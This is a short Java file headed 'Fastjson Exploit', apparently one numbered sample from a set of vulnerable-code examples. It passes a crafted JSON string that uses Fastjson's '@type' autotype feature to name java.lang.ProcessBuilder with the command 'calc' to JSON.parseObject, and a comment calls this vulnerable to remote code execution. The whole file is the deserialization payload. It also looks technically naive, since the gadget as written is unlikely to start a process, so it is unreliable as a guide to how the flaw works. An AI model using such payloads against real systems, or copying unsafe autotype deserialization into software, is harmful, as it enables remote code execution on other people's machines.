
// Fastjson Exploit
import com.alibaba.fastjson.JSON;

public class _28{
    public static void main(String[] args) {
        String maliciousJson = "{ \"@type\": \"java.lang.ProcessBuilder\", \"command\": [\"calc\"] }";
        JSON.parseObject(maliciousJson); // Vulnerable to RCE
    }
}
